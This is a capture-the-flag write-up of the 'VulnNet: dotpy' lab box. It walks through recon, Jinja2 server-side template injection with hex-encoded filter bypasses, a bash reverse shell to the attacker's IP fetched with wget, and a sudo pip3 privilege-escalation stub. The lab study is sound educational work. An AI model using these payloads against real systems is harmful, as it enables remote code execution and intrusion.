---
layout: post
title:  "VulnNet: dotpy"
date:   2022-03-01 16:18:00 +0000
tags: python jinja2 hex
---

## [0x01] Outline

![Subscribe](/assets/img/vulnnet_dotpy/icon.png){: w="100" .left}

VulnNet: dotpy is a medium difficulty box with a focus on `python`.


## [0x02] Recon


### nmap

Running nmap we find port `8080` open

```bash
nmap -sC -sV -oA nmap/scan -p- -v 10.10.132.101

---snip---
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.132.101:8080/login
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
---snip---
```
### website
Browsing to `http://10.10.132.101:8080` we're greeted with a login / sign up form. Many of the links are Anchors that lead nowhere.
Since we know the page is loading we can run our `gobuster` scans, and we'll need to add `-b 403` to force the scan.

![Subscribe](/assets/img/vulnnet_dotpy/01.png){: w="300" .left}

### gobuster
```bash
gobuster dir -u http://10.10.132.101:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o main.gobuster -b 403

cat main.gobuster 
/login                (Status: 200) [Size: 5589]
/register             (Status: 200) [Size: 5021]
/logout               (Status: 302) [Size: 219] [--> http://10.10.132.101:8080/login]
```


### purse
While our scan is running we'll quickly clone the site and check with `pursue`, but there isn't anything of note here.

```bash
wget -rkpN -e robots=off http://10.10.132.101:8080
pursue --query | sort -u
pursue --domain | sort -u
pursue --endpoints | sort -u
```

### Register and Login

Clicking the `Create New Account` takes us to a `/register` page. We'll use `admin`, `admin@admin.com` and password of `admin`, we're prompted to log in.

Once logged in we see an application dashboard we oddly have a user profile picture and the name of `Staradmin`.  It's possible that using `admin` as our username has caused us to get picked off the top of the database or maybe this is what was meant to happen?

![Dashboard](/assets/img/vulnnet_dotpy/02.png){: w="300" .left}

### Walking the site

Most of the links are only Anchor tags so are a dead end.  This took me about 2 hours to find a vulnerability, I tried clicking every button and downloading every file and page I could find.


### SSTI

After trying for an `LFI` at `http://10.10.132.101:8080/etc/passwd` you can see that the path `/etc/passwd` is reflected in the page.
Since our `nmap` banner grab says this site is running `Werkzeug` we can try `Server Side Template Injection (SSTI)`

![404](/assets/img/vulnnet_dotpy/03.png){: w="600" .left}

Trying to go to the path `http://10.10.132.101:8080/{{ 7 * 7 }}` shows the answer `49`.

[HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) examples for other engines are below; 
- {{7*7}}
- ${7*7}
- <%= 7*7 %>
- ${{7*7}}
- #{7*7}

![404](/assets/img/vulnnet_dotpy/04.png){: w="600" .left}

Navigating to `http://10.10.132.101:8080/{{config}}` lists all the config items from with in the Python web server, but we're unable to use a full stops / period `.` in our query as there is some sort of blacklist being checked. After some testing we're unable to use `.`, `_`, `[`, `]`, if we do, we get redirected to a `403` blocked page error. 

## Research

After about a days research I came across this post [https://gusralph.info/jinja2-ssti-research/](https://gusralph.info/jinja2-ssti-research/) that goes into depth on how a `Web Application Firewall (WAF)` might block certain characters and how to bypass the filter with encoding.

It would seam that this box is using the methods detailed in this paper as its inspiration.  The answer is given to us, but I took another few hours to dive into the topic to understand what is happening and how this works. 

>In real PenTests and Bug Bounty situations the answer may need adjustments made.
{: .prompt-info }

### Python Internals

My understanding of this code is we're using `requests` object that is available in this processing of our `GET` request on the server. Then we use this to traverse up the object tree within `Python` to the `globals` and finally down to the `builtins` functions of Python classes. From here this is the same as writing `from os import popen` within the Python interpreter or Python script.

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Now that we know how to run code raw Python using the `Jinja2` templating engine we have to get past the character black list.
Below is the function I wrote to replicate the code given in the research post. We need to prepend `\x` to inform Jinja2 that this is written in `hex` and not the string `5f`.

```python
str(bytes(str(i).encode('utf-8')).hex())
```

Explaining the code above; we take a single letter and encode it to `utf-8`. This insures Python know exactly what character it is, then we turn it into bytes, once it is in bytes we are able to convert it to hex. Finally, we prepend `\x` to our hex value and turn the whole thing into a string.

```python
def utf8_encode(string):
    _tmp = ''
    for i in string:
        if i in ['.','[',']','_']:
            _tmp += r'\x' + str(bytes(str(i).encode('utf-8')).hex())
        else:
            _tmp += i
    return _tmp

string_to_encode = "{{request|attr('application')|attr('__globals__')}}"
print(utf8_encode(string_to_encode))
```

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Testing this command we are able to see the OS `id` command in our error page response.  We'll update our payload to get a reverse shell.

![id](/assets/img/vulnnet_dotpy/05.png){: w="600" .left}


Running `which%20wget` to check if `wget` is available.  From further testing I'm unable to get `/` working in any of the commands.  This will require a multistep process to avoid use the forward slash.

>We need to use `%20` as our space encoding otherwise the server will try to parse it.
{: .prompt-info }

## Attack Chain

Now having all this information available to us, we're able to start formulating our attack chain.
1. Create Bash reverse shell and saving it as `index.html`.  This allows us to download this file without using a forward slash `/`.
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.8.208.76/4242 0>&1'
```

2. Stand up a web server to publish our shell. `sudo` is required to use port `80`, the default port for web servers.
```bash
sudo python3 -m http.server 80
```
3. Download file with `wget`.
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('wget%2010\x2e8\x2e208\x2e76')|attr('read')()}} 
```

4. Run `netcat` to catch reverse connection.
```bash
nc -lnvp 4242
```

1. Run reverse shell `cat index.html|bash`. To use the pipe `|` we'll have to convert to hex `\x7c`.
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat%20index\x2ehtml\x7cbash')|attr('read')()}} 
```

## Foot Hold

Our `netcat` listeners prompt changes, and we're able to run commands as the web user. Let's check for the other users on the system and our `sudo` privileges.

```bash
web@vulnnet-dotpy:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
system-adm:x:1000:1000:system-adm,,,:/home/system-adm:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
manage:x:1002:1002:,,,:/home/manage:/bin/bash
```

```bash
web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

sudo -u system-adm /usr/bin/pip3 install /dev/shm/setup.py

echo 'from os import popen
popen("chmod 777 /dev/shm/*")
popen("/dev/shm/rev.sh")' > setup.py
